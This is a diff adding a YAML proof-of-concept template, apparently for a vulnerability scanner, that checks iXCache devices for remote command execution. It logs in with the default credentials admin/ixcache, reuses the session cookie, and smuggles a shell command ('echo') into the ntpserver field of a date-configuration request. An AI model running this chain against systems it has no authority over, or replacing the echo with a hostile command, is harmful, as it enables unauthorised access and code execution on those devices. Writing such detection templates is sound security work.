@@ -1,0 +1,30 @@
+name: poc-yaml-ixcache-login-rce
+rules:
+    - method: POST
+      path: /login/userverify.cgi
+      follow_redirects: true
+      headers:
+          Content-Type: application/x-www-form-urlencoded
+      body: >-
+        username=admin&password=ixcache
+      expression: |
+        response.status == 200 && response.body.bcontains(b'URL=/cgi-bin/monitor.cgi')
+      search: >-
+        Set-Cookie: pauser(?P<session>.+?)Path=/;
+    - method: POST
+      path: /cgi-bin/Maintain/date_config
+      follow_redirects: true
+      headers:
+          Cookie: pauser{{session}}
+          Content-Type: application/x-www-form-urlencoded
+      body: >-
+        ntpserver=0.0.0.0%3Becho+1314520&year=2000&month=08&day=15&hour=11&minute=34&second=53&ifname=fxp1
+      expression: |
+        response.status == 200 && response.body.bcontains(b'1314520')
+        
+detail:
+    author: ixcache-login-rce
+    links:
+        - https://www.baidu.com
+        - title="iXCache"
+
